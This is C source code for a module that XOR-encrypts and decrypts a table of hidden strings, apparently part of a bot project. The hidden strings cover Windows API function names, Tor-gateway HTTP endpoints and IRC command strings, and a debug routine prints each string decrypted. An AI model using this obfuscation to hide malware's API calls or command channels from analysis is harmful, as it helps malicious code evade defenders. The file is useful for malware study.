#include "compat.h"

#include <stdio.h>
#include <stdlib.h>

#include "crypt.h"
#include "crypt_strings.h"


static unsigned int xorkey = XOR_KEY;
static struct string strs[] = {
    NULLENT(XOR_STARTFUNCS),
    /* kernel32.dll */
    XOR_KEY_FUNCS_STRINGS,
    XOR_KEY_FUNCS_INFO_STRINGS,
    XOR_KEY_FUNCS_KERNEL_STRINGS,
#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
    XOR_KEY_FUNCS_DEBUG_STRINGS,
#endif
    /* -------------------- */
    NULLENT(XOR_ENDFUNCS),
    /* non-kernel32.dll */
    XOR_KEY_FUNCS_OTHER_STRINGS,
    /* ------------------ */
    NULLENT(XOR_ENDFUNCS_OTHER),
    XOR_KEY_HTTP_STRINGS,
#ifdef _HTTP_LOCALHOST
    XOR_KEY_HTTP_LOCALHOST_STRINGS,
#else
    XOR_KEY_HTTP_WEB2TOR_STRINGS,
#endif
#ifdef _ENABLE_IRC
    NULLENT(XOR_SOCK_FUNCS_START),
    XOR_KEY_SOCK_FUNCS_STRINGS,  /* Ws32.dll functions */
    NULLENT(XOR_SOCK_FUNCS__END),
    XOR_KEY_SOCK_STRS_STRINGS, /* cmds, irc strings */
#endif
    XOR_KEY_ROOT_STRINGS,
#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
#ifdef _USE_PIPES
    XOR_KEY_DEBUG_STRINGS,
#endif
#endif
};


static inline char* crypt_string(char* cryptBuf, const uint8_t len)
{
    xor32_byte_crypt((unsigned char*)cryptBuf, len, xorkey);
    return cryptBuf;
}

uint8_t crypt_len(enum stridx i)
{
    return strs[i].len;
}

char* decrypt_string(enum stridx i, char* plainStrPtr)
{
    if (i > STR_MAX) {
        plainStrPtr[0] = 0;
        return plainStrPtr;
    }
    memcpy(plainStrPtr, strs[i].str, strs[i].len);
    char* buf = crypt_string(plainStrPtr, strs[i].len);
    buf[strs[i].len + 1] = 0;
    return buf;
}

int get_string_in_strings(char* strings, char delim, char** pDest, char** pEnd)
{
    if (!pDest || !pEnd)
        return -1;

    if (*pDest == NULL) {
        *pDest = strings;
    } else if (*pEnd) {
        *(*pEnd) = delim;
        *pDest = ++(*pEnd);
    } else return 1;

    {
        *pEnd = COMPAT(strchr)(*pDest, delim);
        if (*pEnd) {
            *(*pEnd) = 0;
        }
    }
    return 0;
}

inline int get_string_in_strings_d(char* strings, char** pDest, char** pEnd)
{
    return get_string_in_strings(strings, '#', pDest, pEnd);
}

int get_string_in_strings_i(char* strings, char delim, int idx, char** pDest, char** pEnd)
{
    int i = -1;
    while (i++ != idx && get_string_in_strings(strings, delim, pDest, pEnd) == 0) {
    }
    return (i-1 == idx ? 0 : 1);
}

inline int get_string_in_strings_di(char* strings, int idx, char** pDest, char** pEnd)
{
    return get_string_in_strings_i(strings, '#', idx, pDest, pEnd);
}

inline void string_restore_delim(char* pEnd)
{
    if (pEnd)
        *pEnd = '#';
}


#ifdef _STRINGS_BIN
#include "helper.h"
void addTrimSpaces(char* outbuf, long insiz, long trimsiz)
{
    trimsiz -= insiz;
    if (trimsiz > 0) {
        memset(outbuf, ' ', trimsiz);
        outbuf[trimsiz] = 0;
    } else outbuf[0] = 0;
}

int main(void)
{
    const long trimsiz1 = 70;
    const long trimsiz2 = 25;
    char buf1[trimsiz1+1];
    char buf2[trimsiz2+1];

    for (size_t i = 0; i < STR_MAX; ++i) {
        if (strs[i].len == 0 || strs[i].str == NULL) {
            memset(&buf2[0], '-', trimsiz2);
            buf2[trimsiz2] = 0;
            printf("%s %s -> %lu -> NULL %s\n", buf2, strs[i].name, i, buf2);
            continue;
        }

        DBUF(i, tmp);

        char* chex = bintostr(strs[i].str, strs[i].len, 1, NULL);
        long csiz = strlen(chex)-1;
        chex[csiz] = 0;
        addTrimSpaces(buf1, csiz, trimsiz1);

        long nsiz = strlen(strs[i].name);
        if (csiz < trimsiz1) {
            addTrimSpaces(buf2, nsiz, trimsiz2);
        } else buf2[0] = 0;

        printf("C(%03u): %s%s -> %s%s -> P(%03u): %s\n", (uint8_t)strs[i].len, chex, buf1, strs[i].name, buf2, (uint8_t)strlen(tmp), tmp);
        free(chex);

        char* cur = NULL;
        char* end = NULL;
        int ret = get_string_in_strings_d(tmp, &cur, &end);
        ret = get_string_in_strings_d(tmp, &cur, &end);
        if (ret == 0) {
            string_restore_delim(end);
            cur = NULL;
            end = NULL;

            int max = 0;
            while (get_string_in_strings_d(tmp, &cur, &end) == 0) {
                addTrimSpaces(buf2, 0, trimsiz2);
                printf("%s SUBSTRING -> %s\n", buf2, cur);
                max++;
            }

            printf("\n");

            for (int i = 0; i < max; ++i) {
                cur = NULL;
                end = NULL;
                if (get_string_in_strings_di(tmp, i, &cur, &end) == 0) {
                    addTrimSpaces(buf2, 4, trimsiz2);
                    printf("%s SUBSTRING(%02d) -> %s\n", buf2, i, cur);
                    string_restore_delim(end);
                }
            }
        }
    }

    return 0;
}
#endif
